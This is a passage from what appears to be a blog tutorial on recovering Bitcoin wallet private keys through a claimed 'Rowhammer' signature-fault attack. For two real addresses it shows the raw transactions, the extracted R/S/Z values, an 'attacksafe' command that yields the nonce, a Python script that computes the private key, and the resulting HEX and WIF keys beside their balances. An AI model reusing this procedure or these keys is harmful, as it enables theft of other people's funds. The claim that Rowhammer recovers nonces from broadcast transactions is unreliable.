<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-197-1024x458.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1373"><figcaption><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 708.02</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener"><strong>96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef</strong></a>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-131-1024x141.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1214"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-132-1024x302.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1217"></figure>



<pre class="wp-block-code"><code>R = 0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
S = 0x282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad5
Z = 0x7270a25b48c53581f9babe8edcf27f9a038e7b57e817a8b242a49e2248bc71a7</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-135-1024x351.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1225"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-136-1024x524.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1227"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3

RawTX = 010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-137-1024x99.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1229"></figure>



<p><code>(0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2 , 0x212c1b682ab25c069306f57725e904094c352014ea78903fbc153a129f3171e4)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
S = 0x282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad5
Z = 0x7270a25b48c53581f9babe8edcf27f9a038e7b57e817a8b242a49e2248bc71a7</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
point2gen  =   (0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2 , 0x212c1b682ab25c069306f57725e904094c352014ea78903fbc153a129f3171e4)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3
R = 0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
S = 0x282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad5
Z = 0x7270a25b48c53581f9babe8edcf27f9a038e7b57e817a8b242a49e2248bc71a7


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-139.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1233"></figure>



<p><code>PrivKey = aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o
WIF:  L2vaWmjh7XpV9AMWDjmNSGPQNEd4QG7YGAMMqPEmGSt8WSppysCV
HEX:  aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/001-2.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1236"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-198-1024x458.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1375"><figcaption><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 708.02</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№2</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29</a></p><p><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-99-1024x201.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1136"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-100-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1138"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-140-1024x143.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1242"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-144-1024x245.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1250"></figure>



<pre class="wp-block-code"><code>R = 0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
S = 0x48c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f
Z = 0x51e6147848d2e81e2b6b71a5f2b29be5121752b88cc1d5e1392c001b04b4c2d9</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-145-1024x299.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1252"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-146-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1254"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca

RawTX = 0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-147-1024x98.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1257"></figure>



<p><code>(0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386 , 0x3f43332421ee70c0e0ccab01f0b916fdf087f1df6cd2227f6d8d7212a3e6f806)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
S = 0x48c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f
Z = 0x51e6147848d2e81e2b6b71a5f2b29be5121752b88cc1d5e1392c001b04b4c2d9</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
point2gen  =   (0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386 , 0x3f43332421ee70c0e0ccab01f0b916fdf087f1df6cd2227f6d8d7212a3e6f806)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca
R = 0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
S = 0x48c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f
Z = 0x51e6147848d2e81e2b6b71a5f2b29be5121752b88cc1d5e1392c001b04b4c2d9


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-148.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1259"></figure>



<p><code>PrivKey = 86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18hhdfynnojmiMmBMsrkXNFWketq4mmDHB
WIF:  L1jMLZYkKr2YoTLH9xWXS9jPMgeasnTxWmGrHBK9aMCW9ahsNDzP
HEX:  86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/002-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1263"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-150-1024x445.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1266"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 708.99</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-152-1024x142.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1274"></figure>



